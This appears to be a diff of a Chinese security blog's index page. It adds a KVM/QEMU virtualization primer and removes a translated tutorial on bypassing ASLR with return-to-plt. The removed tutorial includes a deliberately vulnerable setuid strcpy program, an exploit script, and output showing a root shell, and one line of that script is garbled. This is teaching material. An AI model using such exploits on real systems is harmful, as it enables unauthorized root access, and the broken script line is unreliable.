@@ -112,6 +112,85 @@
         
           <section id="main">
   
+    <article id="post-kvmqemuintro"  class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      <a class="article-title" href="/20170102/kvmqemuintro/">KVM/QEMU虚拟化简介</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	Posted on <a href="/20170102/kvmqemuintro/" class="article-date">
+	  <time datetime="2017-01-02T07:53:39.000Z" itemprop="datePublished">一月 2, 2017</time>
+	</a>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>作者：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+<hr>
+<p><strong>CSysSec注</strong>： 本文来自<a href="http://www.chongh.wiki/about/" target="_blank" rel="external">Diting0x</a>的<a href="http://www.chongh.wiki/blog/2016/01/02/kvm-qemu-bytalk/" target="_blank" rel="external">个人博客</a>，主要介绍KVM/QEMU虚拟化基础，对认识KVM与QEMU之间的关系有很大帮助。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170102/kvmqemuintro/" target="_blank" rel="external">KVM/QEMU虚拟化简介</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+<hr>
+<blockquote>
+<ul>
+<li>0X01 KVM/Qemu选择与部署</li>
+<li>0X02 KVM/Qemu原理概览</li>
+</ul>
+</blockquote>
+<h3 id="0X01-KVM-Qemu选择与部署"><a href="#0X01-KVM-Qemu选择与部署" class="headerlink" title="0X01 KVM/Qemu选择与部署"></a>0X01 KVM/Qemu选择与部署</h3><p>KVM作为虚拟机监控器VMM，分为两部分，分别是运行于kernel模式的KVM内核模块（kvm-kmod)和运行于user模式的Qemu模块。KVM的具体实现下文会作简单介绍。先来看kvm-kmod部分，linux kernel从2.6版本开始便开始集成了KVM模块，如果你只想简单的使用KVM，只需简单编译和配置内科即可使用KVM的一切特性，这里不作介绍，如果你想基于KVM做开发，还是老老实实去<a href="http://sourceforge.net/projects/kvm/files/" target="_blank" rel="external">kvm官网</a>下载，自己源码安装吧，在选择KVM版本之前，可以打开任意一个版本例如kvm-kmod-3.8里面的configure文件，可看到以下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"># minimum is 2.6.x</div><div class="line">min_kernel_version=24</div><div class="line"># maximum is 3.x</div><div class="line">max_kernel_version=8</div><div class="line">kernel_version=`echo $kernel_version_str | sed &apos;s/\([0-9]*\)\.[0-9]*\.[0-9]*.*/\1/&apos;`</div><div class="line">kernel_patchlevel=`echo $kernel_version_str | sed &apos;s/[0-9]*\.\([0-9]*\)\.[0-9]*.*/\1/&apos;`</div><div class="line">kernel_sublevel=`echo $kernel_version_str | sed &apos;s/[0-9]*\.[0-9]*\.\([0-9]*\).*/\1/&apos;`</div><div class="line">if [ ! -n &quot;$force_build&quot; ]; then</div><div class="line">	if [ $kernel_version -eq 2 ] &amp;&amp; [ $kernel_sublevel -lt $min_kernel_version ]; then</div><div class="line">		echo</div><div class="line">		echo &quot;Error: kernel is too old for this kvm-kmod release.&quot;</div><div class="line">		echo</div><div class="line">		exit 1</div><div class="line">	elif [ $kernel_version -eq 3 ] &amp;&amp; [ $kernel_patchlevel -gt $max_kernel_version ]; then</div><div class="line">		echo</div><div class="line">		echo &quot;Error: kernel is more recent than KVM modules delivered with this release.&quot;</div><div class="line">		echo &quot;You probably want to use the KVM support that is already part of your kernel.&quot;</div><div class="line">		echo</div><div class="line">		exit 1</div><div class="line">	fi</div><div class="line">fi</div></pre></td></tr></table></figure></p>
+<p>这段代码仔细看看，就不难看出kvm-kmod版本的每个数字和kernel版本号都是有关联的，kvm-kmod毕竟是一个内核模块，必须去适应内核，大家如果在安装kvm-kmod时出现kernel is too old 或者kernel is more recent等错误就应该静下来好好看看这段代码了。下载后匹配的kvm-kmod后，安装很简单，只需要执行<code>./configure
+make $$ make install</code>即可</p>
+<p>安装之后，有两个模块<code>kvm.ko kvm-intel.ko</code>便会生成在./kvm/x86文件夹中，执行<code>insmod kvm.ko kvm-intel.ko</code> 或者<code>modprobe kvm.ko kvm-intel.ko</code>，便成功将kvm模块加载到内核了，<br>如果期间出现错误，可执行<code>lsmod | grep kvm</code> 看kvm是否成功加载，或执行<code>dmesg | grep kvm</code>查看具体执行信息。<br>这里强调，kvm-kmod是内核的一个模块，可随时加载随时删除，因此基于kvm的开发，修改kvm的源码之后，编译与运行起来都很方便。</p>
+<p>qemu-kvm是为兼容kvm基于qemu模拟器开发出来的一个分支版本，安装qemu-kvm之前，检查是否有以下依赖包： <code>linux-kernel-headers zlib1g-dev libglib2.0-dev</code>，如果没有<code>apt-get install</code>一下。<br>之后,执行：</p>
+<pre><code>./configure --prefix=/usr/local/kvm 
+make &amp;&amp; make install
+</code></pre><p>即可，qemu-kvm便会安装到/usr/local/kvm路径下，安装成功后，会在此路径的/bin文件夹下出现qemu-img, qemu-system-x86_64等二进制文件,自己也可以选择将这些二进制文件拷贝到根目录下的/bin文件夹中，这样在执行这些二进制文件的时候就不用加前缀/usr/local/kvm/bin了。<br>执行：</p>
+<pre><code>/usr/local/kvm/bin/qemu-img create -f qcow2 imgname.img 10G 
+</code></pre><p>创建一个qcow2格式的空虚拟机img文件<br>执行： </p>
+<pre><code>/usr/local/kvm/bin/qemu-system-x86_64 -hda imgname.img -m 1024 -vnc :1 -cdrom imgname.iso -boot d     
+</code></pre><p>将imgname.iso系统安装到imgname.img中<br>之后利用xvnc4viewer等vnc软件连接虚拟机完成安装过程，安装完后，执行:</p>
+<pre><code>/usr/local/kvm/bin/qemu-system-x86_64 -hda imgname.img -vnc :1 -m 1024 -monitor stdio  
+</code></pre><p>登陆到虚拟机。具体细节可自行摸索。</p>
+<h3 id="0X02-KVM-Qemu原理概览"><a href="#0X02-KVM-Qemu原理概览" class="headerlink" title="0X02 KVM/Qemu原理概览"></a>0X02 KVM/Qemu原理概览</h3><p>说说kvm与qemu的关系，借用实验室某大神给的一张图：</p>
+<p><img src="http://7xppf1.com1.z0.glb.clouddn.com/kvm-qemu.png" alt="kvm-qemu-rela"></p>
+<p>可以看到，这里有三种模式，第一是客户机执行时所处的Guest模式，也就是虚拟化技术VMX中的非Root模式；第二是KVM运行的Kernel模式，即VMX中的Root模式，此时特权级为0；第三是Qemu运行的User模式，处于VMX Root模式中的特权级3.有关VMX技术，以及非Root模式如何通过VM Exit进入到Root模式，Root模式如何通过VM Entry进入到非Root模式，可参考Intel系统编程手册。</p>
+<p>简单说说Qemu所在的User模式如何与KVM所在的kernel模式交互，虚拟化中的VT-x技术的支持，使得KVM可以虚拟出多个虚拟处理器VCPU, 而这些VCPU对应每一个Qemu线程，VCPU的创建、初始化、运行以及退出都是在Qemu线程的上下文中进行，这些过程都是通过Qemu向KVM发送一个I/O通道管理函数ioctl来完成，以qemu-kvm-1.1.2为例，qemu-kvm中首先会在<code>./linux-header/linux/kvm.h</code>注册相应的ioctl,如<code>#define KVM_GET_REGS              _IOR(KVMIO,  0x81, struct kvm_regs)</code>，各参数含义可以具体去了解ioctl的实现方式，之后调用<code>kvm_vcpu_ioctl(env,KVM_GET_REGS,&amp;regs)</code>（有些也会调用kvm_vm_ioctl），KVM-Kmod中也会注册相应的ioctl，之后真正执行时会调用KVM_Kmod的相应函数，一般会在<code>kvm_main.c</code>文件中定义。如果想自定义自己的函数，需要分别在qemu-kvm与kvm-kmod注册相应的ioctl，只要编号不重复即可，注册后再调用自己定义的函数。</p>
+<p>备注：Qemu 线程以 ioctl 的方式向 KVM 内核模块发出指 示,后者执行 VM entry 操作,将处理器由 kernel 模式切换到 Guest 模式,中止宿主机软件, 转而运行客户软件。注意,宿主机软件被中止时,正处于 Qemu 线程上下文,且正在执行 ioctl 系统调用的 kernel 模式处理程序。客户软件在运行过程中,如发生异常或外部中断等事件, 或执行 I/O 操作,可能导致 VM exit,将处理器状态由 Guest 模式切换回 Kernel 模式。KVM 内核模块检查发生 VM exit 的原因,如果 VM exit 由于 I/O 操作导致,则执行系统调用返回操 作,将 I/O 操作交给处于 User 模式的 Qemu 线程来处理,Qemu 线程在处理完 I/O 操作后再 次执行 ioctl,指示 KVM 切换处理器到 Guest 模式,恢复客户软件的运行;如果 VM exit 由于 其它原因导致,则由 KVM 内核模块负责处理,并在处理后切换处理器到 Guest 模式,恢复 客户机的运行。</p>
+<p>完</p>
+<p>作者@<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+<p>于2016年1月1日West Lafayette, Lawson Computer Science Building.</p>
+<hr>
+<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170102/kvmqemuintro/" target="_blank" rel="external">KVM/QEMU虚拟化简介</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+	<span class="ico-folder"></span>
+    <a class="article-category-link" href="/categories/虚拟化基础/">虚拟化基础<span class="article-category-count">6</span></a>
+
+
+      
+  <span class="ico-tags"></span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/KVM/">KVM</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/QEMU/">QEMU</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Virtualization/">Virtualization</a></li></ul>
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+<!-- Table of Contents -->
+
+  
     <article id="post-libvmikvm"  class="article article-type-post" itemscope itemprop="blogPost" >
   <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
     
@@ -491,129 +570,6 @@
 <!-- Table of Contents -->
 
   
-    <article id="post-bypassaslr-returntoplt"  class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/20170101/bypassaslr-returntoplt/">绕过ASLR-第一篇章(return-to-plt)</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	Posted on <a href="/20170101/bypassaslr-returntoplt/" class="article-date">
-	  <time datetime="2017-01-01T03:40:21.000Z" itemprop="datePublished">一月 1, 2017</time>
-	</a>
-
-    </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <hr>
-<p><strong>CSysSec注</strong>： 本系列文章译自安全自由工作者<a href="https://sploitfun.wordpress.com/about-2/" target="_blank" rel="external">Sploitfun</a>的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，本系列所有文章涉及的源码可以在<a href="https://github.com/sploitfun/lsploits" target="_blank" rel="external">这里</a>找到。CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170101/bypassaslr-returntoplt" target="_blank" rel="external">Linux(X86)漏洞利用系列-绕过ASLR-第一篇章(return-to-plt)</a>》</p>
-<hr>
-<blockquote>
-<ul>
-<li>0x01 ASLR</li>
-<li>0x02 Return-to-plt</li>
-<li>0x03 调用‘function@PLT’</li>
-</ul>
-</blockquote>
-<p><u>阅读基础</u>:<br>    <a href="http://www.csyssec.org/20161230/stackbufferflow" target="_blank" rel="external">经典栈缓冲区溢出</a><br><u>VM Setup</u>: Ubuntu 12.04(x86)</p>
-<p>在前面的文章中，为了利用漏洞代码，攻击者需要知道：</p>
-<ul>
-<li>栈地址（为了跳转到shellcode中)</li>
-<li>libc基地址(为了成功绕过NX)</li>
-</ul>
-<p>因此，为了防御攻击者的行为，安全研究人员提出一种漏洞利用缓解(exploit mitigation)方法: “ASLR”</p>
-<h3 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h3><p>地址空间布局随机化(ASLR)是一种漏洞利用缓解方法，其可以随机化</p>
-<ul>
-<li>栈地址</li>
-<li>堆地址</li>
-<li>共享库地址</li>
-</ul>
-<p>上述地址一旦被随机化，尤其是当共享库地址被随机化时，由于攻击者需要知道libc的基地址，我们前面提到的绕过NX的方法不再有效。但这种缓解技术也不是完全安全的。</p>
-<p>从<a href="">前文</a>中，我们已经知道exp.py中的 libc函数地址是以下面计算方式得到的：</p>
-<pre><code>libc函数地址=libc基地址+函数偏移
-</code></pre><p>这里</p>
-<ul>
-<li>由于随机化被关闭，libc基地址是个常量(在‘vuln’二进制文件中是0xb7e22000)</li>
-<li>函数偏移也是常量(可以执行”readelf -s libc.so.6 | grep”获取)</li>
-</ul>
-<p>现在当我们利用以下命令打开全随机化选项时(full randomization)</p>
-<pre><code>#echo 2 &gt; /proc/sys/kernel/randomize_va_space
-</code></pre><p>libc基地址将会被随机化</p>
-<p><u>注意</u>： 只有libc的基地址被随机化了，从基地址开始的一个特殊函数的偏移仍然是个常量！因此，尽管打开了ASLR,只要我们能利用下面三项技术绕过共享库基地址的随机化，漏洞程序仍然能被成功利用.</p>
-<ul>
-<li>Return-to-plt（<a href="http://www.csyssec.org/20170101/bypassaslr-returntoplt" target="_blank" rel="external">这篇文章</a>）</li>
-<li>暴力破解(<a href="http://www.csyssec.org/20170101/bypassaslr-bruteforce" target="_blank" rel="external">第二篇章</a>)</li>
-<li>GOT覆盖与GOR解引用(<a href="http://www.csyssec.org/20170101/bypassaslr-gotgor" target="_blank" rel="external">第三篇章</a>)</li>
-</ul>
-<h3 id="Return-to-plt"><a href="#Return-to-plt" class="headerlink" title="Return-to-plt"></a>Return-to-plt</h3><p>利用这项技术，攻击者返回到一个函数的PLT(其地址没有被随机化-在执行之前就可以知道)，而不是返回到libc函数(其地址被随机化了)。 由于’function@PLT’没有被随机化，攻击者不需要预测libc的基地址，而只要简单地返回到‘function@PLT’就可以调用这个’function’。</p>
-<pre><code>什么是PLT,如何调用‘function@PLT&apos;来调用其中的&apos;function&apos;
-</code></pre><h3 id="调用‘function-PLT’"><a href="#调用‘function-PLT’" class="headerlink" title="调用‘function@PLT’"></a>调用‘function@PLT’</h3><p>要了解过程链接表（Procedural Linkage Table(PLT)）,先来简单介绍一下共享库！</p>
-<p>不同于静态库的是，共享库的text段在多个进程间共享，但它的数据段在每个进程中是唯一的。这样设计可以减少内存和磁盘空间。正是text段在多个进程间共享，其必须只有读和执行权限。没有了写权限，动态链接器不能在text段内部重定位数据描述符(data symbol)或者函数地址。这样一来，程序运行期间，动态链接器是如何在不修改text段的情况下，重定位共享库描述符的呢? 利用PIC!</p>
-<pre><code>什么是PIC呢？
-</code></pre><p>位置独立代码(Position Independent Code(PIC))用来解决这个问题： 尽管共享库的text段在加载期间执行重定为，也能确保它能在多个进程中共享。PIC通过一层间接寻址来达到这个目的。共享库的text段中没有绝对虚拟地址来替代全局描述符和函数引用，而是指向数据段中的一个特定表。这个表用来存放全局描述符和函数的绝对虚拟地址。动态链接器作为重定位的一部分会填充这个表。因此，在重定位时，只有数据段被修改，而text段依然完好无顺。</p>
-<p>动态链接器使用下面两种方法来重定位PIC中的全局描述符和函数：</p>
-<ul>
-<li><u>全局偏移表(Global Offset Table(GOT))</u>: 全局偏移表为每个全局变量分配一个4字节的表项，这4个字表项中含有全局变量的地址。当代码段中的一条指令引用一个全局变量时，这条指令指向的是GOT中的一个表项，而不是全局变量的绝对虚拟地址。当共享库被加载时，动态链接库会重定位这个GOT表项。因此，PIC利用GOT通过一层间接寻址来重定位全局描述符.</li>
-<li><u>过程链接表(Procedural Linkage Table(PLT)): 过程链接表含有每个全局函数的存根代码。text段中的一条call指令不会直接调用这个函数(‘function’)，而是调用这个存根代码(function@PLT)。存根代码在动态链接器的帮助下，解析函数地址并将其拷贝到GOT(GOT[n])中。解析过程只发生在第一次调用函数(‘function’)的时候,之后代码段中的call指令调用存根代码(function@PLT)而不是调用动态链接器去解析函数地址(‘function’)。存根代码直接从GOT(GOT[n])获取函数地址并跳转到那里。因此，PIC利用PLT通过两层间接寻址来重定位函数地址</u></li>
-</ul>
-<p>很高兴你知道了PIC并能理解它能保证共享库的text段的完整性，因此能帮助共享库的text段再许多进程间共享！ 但你是否怀疑过，为什么可执行文件的text段并不在任何进程间共享，也需要有个GOT表项或者PLT存根代码呢？这是出于安全保护机制的考虑。如今默认情况下，text段只提供读和执行权限并没有写权限(R_X)。这种保护机制并允许动态链接库对text段进行写操作，因此也就不能重定位text段内部的数据描述符或函数地址。为了让动态链接器能重定位，可执行文件同共享库一样也需要GOT表项和PLT存根代码。</p>
-<p><u>代码样例</u>：</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//eg.c</span></div><div class="line"><span class="comment">//$gcc -g -o eg eg.c</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</div><div class="line"> <span class="built_in">printf</span>(<span class="string">"Hello %s\n"</span>, argv[<span class="number">1</span>]);</div><div class="line"> <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>下面的汇编代码说明了’printf’并不是直接被调用，而是其相应的PLT代码 ‘printf@PLT’被调用了。</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">(gdb) disassemble main</div><div class="line">Dump of assembler code <span class="keyword">for</span> function main:</div><div class="line"> <span class="number">0x080483e4</span> &lt;+<span class="number">0</span>&gt;: push %ebp</div><div class="line"> <span class="number">0x080483e5</span> &lt;+<span class="number">1</span>&gt;: mov %esp,%ebp</div><div class="line"> <span class="number">0x080483e7</span> &lt;+<span class="number">3</span>&gt;: and $<span class="number">0xfffffff0</span>,%esp</div><div class="line"> <span class="number">0x080483ea</span> &lt;+<span class="number">6</span>&gt;: sub $<span class="number">0x10</span>,%esp</div><div class="line"> <span class="number">0x080483ed</span> &lt;+<span class="number">9</span>&gt;: mov <span class="number">0xc</span>(%ebp),%eax</div><div class="line"> <span class="number">0x080483f0</span> &lt;+<span class="number">12</span>&gt;: add $<span class="number">0x4</span>,%eax</div><div class="line"> <span class="number">0x080483f3</span> &lt;+<span class="number">15</span>&gt;: mov (%eax),%edx</div><div class="line"> <span class="number">0x080483f5</span> &lt;+<span class="number">17</span>&gt;: mov $<span class="number">0x80484e0</span>,%eax</div><div class="line"> <span class="number">0x080483fa</span> &lt;+<span class="number">22</span>&gt;: mov %edx,<span class="number">0x4</span>(%esp)</div><div class="line"> <span class="number">0x080483fe</span> &lt;+<span class="number">26</span>&gt;: mov %eax,(%esp)</div><div class="line"> <span class="number">0x08048401</span> &lt;+<span class="number">29</span>&gt;: call <span class="number">0x8048300</span> &lt;<span class="built_in">printf</span>@plt&gt;</div><div class="line"> <span class="number">0x08048406</span> &lt;+<span class="number">34</span>&gt;: mov $<span class="number">0x0</span>,%eax</div><div class="line"> <span class="number">0x0804840b</span> &lt;+<span class="number">39</span>&gt;: leave </div><div class="line"> <span class="number">0x0804840c</span> &lt;+<span class="number">40</span>&gt;: ret </div><div class="line">End of assembler dump.</div><div class="line">(gdb) disassemble <span class="number">0x8048300</span></div><div class="line">Dump of assembler code <span class="keyword">for</span> function <span class="built_in">printf</span>@plt:</div><div class="line"> <span class="number">0x08048300</span> &lt;+<span class="number">0</span>&gt;: jmp *<span class="number">0x804a000</span></div><div class="line"> <span class="number">0x08048306</span> &lt;+<span class="number">6</span>&gt;: push $<span class="number">0x0</span></div><div class="line"> <span class="number">0x0804830b</span> &lt;+<span class="number">11</span>&gt;: jmp <span class="number">0x80482f0</span></div><div class="line">End of assembler dump.</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
-<p>在’printf’第一次被调用前，其相应的GOT表项(0x804a000)指回到PLT代码(0x8048306)本身。因此，当printf函数第一次被调用时，其相应的函数地址通过动态链接器来解析。</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">(gdb) x/<span class="number">1</span>xw <span class="number">0x804a000</span></div><div class="line"><span class="number">0x804a000</span> &lt;<span class="built_in">printf</span>@got.plt&gt;: <span class="number">0x08048306</span></div><div class="line">(gdb)</div></pre></td></tr></table></figure>
-<p>现在printf被调用之后，其相应的GOT表项含有printf的函数地址(如下图):</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">(gdb) x/<span class="number">1</span>xw <span class="number">0x804a000</span></div><div class="line"><span class="number">0x804a000</span> &lt;<span class="built_in">printf</span>@got.plt&gt;: <span class="number">0xb7e6e850</span></div><div class="line">(gdb)</div></pre></td></tr></table></figure>
-<p><u>注意 1</u>: 如果你想了解PLT和GOT的更多信息，可以阅读<a href="">这篇</a>文章</p>
-<p><u>注意 2</u>: 我会在别的文中单独谈谈动态链接器是如何解析libc函数地址的。现在只要记住下面两条语句(printf@PLT的一部分）是用来解析函数地址的！</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="number">0x08048306</span> &lt;+<span class="number">6</span>&gt;: push $<span class="number">0x0</span></div><div class="line"><span class="number">0x0804830b</span> &lt;+<span class="number">11</span>&gt;: jmp <span class="number">0x80482f0</span></div></pre></td></tr></table></figure>
-<p>了解这个之后，我们可以知道攻击者并不需要知道libc函数的地址来调用libc函数，只要简单通过’function@PLT’（在执行前知道）就可以调用了。</p>
-<p><u>漏洞代码</u>:</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="comment">/* Eventhough shell() function isnt invoked directly, its needed here since 'system@PLT' and 'exit@PLT' stub code should be present in executable to successfully exploit it. */</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span> </span>&#123;</div><div class="line"> system(<span class="string">"/bin/sh"</span>);</div><div class="line"> <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</div><div class="line"> <span class="keyword">int</span> i=<span class="number">0</span>;</div><div class="line"> <span class="keyword">char</span> buf[<span class="number">256</span>];</div><div class="line"> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);</div><div class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,buf);</div><div class="line"> <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p><u>编译命令</u>:</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#echo 2 &gt; /proc/sys/kernel/randomize_va_space</span></div><div class="line">$gcc -g -fno-<span class="built_in">stack</span>-protector -o vuln vuln.c</div><div class="line">$sudo chown root vuln</div><div class="line">$sudo chgrp root vuln</div><div class="line">$sudo chmod +s vuln</div></pre></td></tr></table></figure>
-<p>现在反汇编可执行文件’vuln’,我们可以找出’system@PLT’与’exit@PLT’的地址</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">(gdb) disassemble shell</div><div class="line">Dump of assembler code <span class="keyword">for</span> function shell:</div><div class="line"> <span class="number">0x08048474</span> &lt;+<span class="number">0</span>&gt;: push %ebp</div><div class="line"> <span class="number">0x08048475</span> &lt;+<span class="number">1</span>&gt;: mov %esp,%ebp</div><div class="line"> <span class="number">0x08048477</span> &lt;+<span class="number">3</span>&gt;: sub $<span class="number">0x18</span>,%esp</div><div class="line"> <span class="number">0x0804847a</span> &lt;+<span class="number">6</span>&gt;: movl $<span class="number">0x80485a0</span>,(%esp)</div><div class="line"> <span class="number">0x08048481</span> &lt;+<span class="number">13</span>&gt;: call <span class="number">0x8048380</span> &lt;system@plt&gt;</div><div class="line"> <span class="number">0x08048486</span> &lt;+<span class="number">18</span>&gt;: movl $<span class="number">0x0</span>,(%esp)</div><div class="line"> <span class="number">0x0804848d</span> &lt;+<span class="number">25</span>&gt;: call <span class="number">0x80483a0</span> &lt;<span class="built_in">exit</span>@plt&gt;</div><div class="line">End of assembler dump.</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
-<p>利用这些地址，我们就可以写出绕过ASLR(与NX)的漏洞利用代码！</p>
-<p><u>漏洞利用代码</u>：</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">#exp.py</div><div class="line">#!/usr/bin/env python</div><div class="line">import struct</div><div class="line">from subprocess import call</div><div class="line"></div><div class="line">system = 0x8048380</div><div class="line">exit = 0x80483a0</div><div class="line">system_arg = 0x80485b5     #Obtained from hexdump output of executable 'vuln'</div><div class="line"></div><div class="line">#endianess convertion</div><div class="line">def conv(num):</div><div class="line"> return struct.pack("&lt;I",numystem + exit + system_arg</div><div class="line">buf = "A" * 272</div><div class="line">buf += conv(system)</div><div class="line">buf += conv(exit)</div><div class="line">buf += conv(system_arg)</div><div class="line"></div><div class="line">print "Calling vulnerable program"</div><div class="line">call(["./vuln", buf])</div></pre></td></tr></table></figure>
-<p>执行上述程序就可以获取root shell，如下所示：</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ python <span class="built_in">exp</span>.py </div><div class="line">Calling vulnerable program</div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA������</div><div class="line"><span class="meta"># id</span></div><div class="line">uid=<span class="number">1000</span>(sploitfun) gid=<span class="number">1000</span>(sploitfun) euid=<span class="number">0</span>(root) egid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">4</span>(adm),<span class="number">24</span>(cdrom),<span class="number">27</span>(sudo),<span class="number">30</span>(dip),<span class="number">46</span>(plugdev),<span class="number">109</span>(lpadmin),<span class="number">124</span>(sambashare),<span class="number">1000</span>(sploitfun)</div><div class="line"># <span class="built_in">exit</span></div><div class="line">$</div></pre></td></tr></table></figure>
